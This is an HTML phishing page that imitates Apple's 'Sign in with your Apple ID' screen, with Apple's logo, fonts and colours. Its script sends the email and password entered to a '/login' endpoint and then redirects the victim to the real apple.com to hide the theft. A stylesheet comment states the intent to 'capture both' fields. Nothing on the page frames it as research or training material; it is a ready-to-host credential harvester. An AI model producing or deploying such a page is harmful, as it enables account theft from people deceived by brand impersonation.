<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Apple</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f5f5f7;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            height: 50px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #1d1d1f;
        }
        p {
            font-size: 17px;
            color: #1d1d1f;
            margin-bottom: 40px;
        }
        .input-group {
            position: relative;
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 18px 15px;
            border: 1px solid #d2d2d7;
            border-radius: 12px;
            font-size: 17px;
            box-sizing: border-box;
            background: #fff;
        }
        input:focus {
            border-color: #0071e3;
            outline: none;
            box-shadow: 0 0 0 4px rgba(0,113,227,0.1);
        }
        .arrow-btn {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #d2d2d7;
        }
        .submit-btn {
            display: none; /* Usually Apple ID is multi-step, but we'll capture both */
        }
        .links {
            margin-top: 30px;
            font-size: 14px;
        }
        .links a {
            color: #0071e3;
            text-decoration: none;
            margin: 0 10px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .login-btn {
            background-color: #0071e3;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 12px 24px;
            font-size: 17px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
        }
    </style>
    <script>
        async function handleLogin(event) {
            event.preventDefault();
            const form = event.target;
            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                if (response.ok) {
                    window.location.href = "https://www.apple.com";
                }
            } catch (error) {
                console.error('Error:', error);
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/500px-Apple_logo_black.svg.png" alt="Apple">
        </div>
        <h1>Sign In</h1>
        <p>Sign in with your Apple ID</p>
        
        <form id="login-form" onsubmit="handleLogin(event)">
            <div class="input-group">
                <input type="text" id="email" name="email" placeholder="Email or Phone Number" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            
            <button type="submit" class="login-btn">→d</button>
        </form>
        
        <div class="links">
            <a href="#">Forgotten your password?</a>
            <a href="#">Create yours now.</a>
        </div>
    </div>
</body>
</html>
